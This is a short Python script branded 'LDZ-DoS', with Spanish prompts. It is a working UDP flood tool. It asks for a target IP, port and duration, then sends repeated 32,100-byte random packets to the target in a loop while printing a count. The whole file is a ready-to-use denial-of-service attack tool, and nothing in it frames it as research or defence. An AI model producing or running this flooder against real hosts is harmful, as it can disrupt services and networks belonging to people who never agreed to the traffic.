import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(32100)
os.system("clear")
os.system("figlet LDZ-DoS")
print("Creado por SanthM & LDZ Team")
print("Fixed Bugs")

ip = input("IP o Enlace: ")
port = int(input("Puerto: "))
dur = int(input("Duracion: "))

timeout = time.time() + dur
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent += 1
        print("Enviando %s paquetes a %s en el puerto %s" % (sent, ip, port))
    except KeyboardInterrupt:
        sys.exit()